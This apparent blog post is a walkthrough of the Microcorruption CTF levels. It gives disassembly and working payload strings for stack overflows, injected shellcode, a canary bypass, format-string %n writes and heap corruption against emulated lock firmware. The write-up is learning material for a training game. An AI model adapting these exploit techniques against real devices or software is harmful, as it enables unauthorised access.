---
layout: blog
title: Microcorruption.com CTF writeup
date:   2017-08-29 19:39:00 +0100
categories: itsec
comments: true
---

# 0xff Preface

# 0x00 Tutorial

PASSWORD
only checks length

```
4484 <check_password>
4484:  6e4f           mov.b @r15, r14
4486:  1f53           inc   r15
4488:  1c53           inc   r12
448a:  0e93           tst   r14
448c:  fb23           jnz   #0x4484 <check_password+0x0>
448e:  3c90 0900      cmp   #0x9, r12
4492:  0224           jeq   #0x4498 <check_password+0x14>
```

if length with null byte is 9, then returns non-zero, so jumps to access granted

# 0x01 New Orleans

```
44c2:  ee9d 0024      cmp.b @r13, 0x2400(r14)
```
![New Orleans image]({{ site.url }}/assets/images/microcorruption/neworleans.png)

compares password and 0x2400, where 0x2400 is from create_password function, so the password is 0x5a42654e5c3b61 (which seems unique for each user)

# 0x2 Sydney

here password is in check_password function, hardcoded:
```
448a <check_password>
448a:  bf90 7751 0000 cmp   #0x5177, 0x0(r15)
4490:  0d20           jnz   $+0x1c
4492:  bf90 2135 0200 cmp   #0x3521, 0x2(r15)
4498:  0920           jnz   $+0x14
449a:  bf90 7235 0400 cmp   #0x3572, 0x4(r15)
44a0:  0520           jne   #0x44ac <check_password+0x22>
44a2:  1e43           mov   #0x1, r14
44a4:  bf90 2564 0600 cmp   #0x6425, 0x6(r15)
44aa:  0124           jeq   #0x44ae <check_password+0x24>
```

0x7751213572352564

each 2 bytes have to be reversed because of the endianness of the system

# 0x3 Hanoi

After the test_password_valid function, there is a compare #0x14 to 0x2410 in memory
```
455a:  f290 1400 1024 cmp.b #0x14, &0x2410
4560:  0720           jne   #0x4570 <login+0x50>
4562:  3f40 f144      mov   #0x44f1 "Access granted.", r15
```
so if we set the last byte of a long enough password to 14, we get access.
The possible solution is 6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d14

# 0x04 Cusco

If you provide enough input characters, at the end of the login function, the sp points to your input(in my case, 0x43fe), thus you can control it.

![Cusco image]({{ site.url }}/assets/images/microcorruption/cusco.png)

Writing the address of unlock_door function to where sp points will call the function on the ret instruction of the login function.

The solution is: 6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d4644

# 0x05 Reykjavik

We can't see any previously known functions, just enc, which indeed writes the unlocking code to memory.
```
4438 <main>
4438:  3e40 2045      mov   #0x4520, r14
443c:  0f4e           mov   r14, r15
443e:  3e40 f800      mov   #0xf8, r14
4442:  3f40 0024      mov   #0x2400, r15
4446:  b012 8644      call  #0x4486 <enc>
444a:  b012 0024      call  #0x2400
```
Setting a breakpoint at 0x444a, and copying the memory dump from 0x2400 to a disassembler, we will get the code which runs the lock.
There is a suspicious part of it, where 0x2464 is called after 0x7f is pushed to the stack. This is the door unlock interrupt, so it is a start. Before that, it compares #0xe49d to r4, and trying this value as a password unlocks the door.
```
3150 0600      add  #0x6, sp
b490 9de4 dcff cmp  #0xe49d, -0x24(r4)
0520           jnz  $+0xc
3012 7f00      push #0x7f
b012 6424      call #0x2464
```
The solution is: 9de4

# 0x06 Whitehorse

The conditional_unlock_door function is connecting to the hardware security module, and there is no easy way to bypass it. We can't jump to unlock_door function as well, because it doesn't exist!
```
0f12           push  r15
3012 7e00      push  #0x7e
b012 3245      call  #0x4532 <INT>
```
So the solution is to include the important part of the unlock_door function, the interrupt in our password, so we can jump there with the ret function of login. The first 8 bytes are the interrupt to the door lock, and the last 2 are the place of this small code in memory.
The solution is: 30127f00b01232456d6d6d6d6d6d6d6df43d

# 0x07 Montevideo

There are a few problems with this level, first of all, we can't insert 7e00 into the input string, because strcpy will only write to the memory until the first zero byte.
First, I tried to create my own door unlock function, by copying the original one, but as you can see, it also includes zero bytes, which prevents them from copying to the memory where eventually the ret instruction will read the sp value, and would jump to our code.
Luckily, the original INT function includes an swpb instruction for r15, which controls the value of the interrupt.
```
4554:  8f10           swpb  r15
4556:  024f           mov   r15, sr
4558:  32d0 0080      bis   #0x8000, sr
455c:  b012 1000      call  #0x10
```
What we can do, is create a value, from which the function will create the desired 0x7f value, and then jump to the part of the INT function, where swpb resides.
```
sub #0xff81, r15
br #0x4554
```
The solution is: 3f8081ff304054456d6d6d6d6d6d6d6dee43

# 0x08 Johannesburg

There is a stack canary protection before the login function, so we have to include that value in our input, to preserve that value, and keep the code running.
```
4578:  f190 5800 1100 cmp.b #0x58, 0x11(sp)
```
Note, that I also had to change the address inside INT function and the ret address where the input code starts.

The solution is: 3f8081ff30409c456d6d6d6d6d6d6d6d6d58ec43

# 0x09 Santa Cruz

Now the lock code is getting serious, and wants not only a password, but a username as well.
This is the memory layout after the username and password has been written by strcpy. 
```
43a0:   0000 7573 6572 6e61 6d65 0000 0000 0000   ..username......
43b0:   0000 0008 1070 6173 7377 6f72 6400 0000   .....password...
43c0:   0000 0000 0000 0000 0000 0000 4044 0000   ............@D..
```

First I tried to overflow the username without success, because
```
464c:  c493 faff      tst.b -0x6(r4)
```
tests if there is a null byte after the password, and if you supply a password which doesn't precisely span until that memory value(r4 is 0x43cc there), than the overflown username will fail this test. So the tactic which I used here, is to overflow the username with a long enough hex to control the sp at the end of the login function, and give an exactly 17 character long password, so the null terminal of that string will eventually make the above test successful, and thus __stop_progExec__ won't be called.
0x44a4 will call the unlock door function at the end.

username: 6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d08126d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d4a44
password: 6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d

# 0x09 Jakarta

This challenge is pretty much the same as the previous, besides the length check of the username and the password, which is the following:
```
4600:  7f90 2100      cmp.b #0x21, r15
```
Here, we can exploit the fact that this only check r15 mod 255, and that the password is copied after the username without a null byte, so if the length of the username is less or equal than 32 and the length of the username and the password modulo 255 is less or equal than 32, we can achieve a lengthy enough password.
We have to care about the position of the address of the unlock_door function(0x444c)
The solution is the following:
```
#username:
python -c 'print "6d" * 32'|xclip
#password:
python -c 'print "6e" * 4 + "4c44" + "6e" * 220'|xclip
```

# 0x0a Addis Ababa


50405040256e
4f40256e

sp+2 before printf
%x%n
50402578256e

# 0x0b Novosibirsk

44c8 is the address of the interrupt parameter

```
44b0 <conditional_unlock_door>
44b0:  0412           push  r4
44b2:  0441           mov   sp, r4
44b4:  2453           incd  r4
44b6:  2183           decd  sp
44b8:  c443 fcff      mov.b #0x0, -0x4(r4)
44bc:  3e40 fcff      mov   #0xfffc, r14
44c0:  0e54           add   r4, r14
44c2:  0e12           push  r14
44c4:  0f12           push  r15
44c6:  3012 7e00      push  #0x7e
44ca:  b012 3645      call  #0x4536 <INT>
```
we overwrite #0x7e to #0x7f, with 127 characters password
```
python -c 'print "c844" * 61 + "d6" + "2578256e"'|xclip
```

# 0x0c Algiers

This is a classical heap corruption technique, we have to replace the end of the free function, so the code doesn't return, and continues to unlock_door.

![Algiers image]({{ site.url }}/assets/images/microcorruption/algiers.png)

username:
```
python -c 'print "61" * 16 + "444462452100"'|xclip
```
password:
61
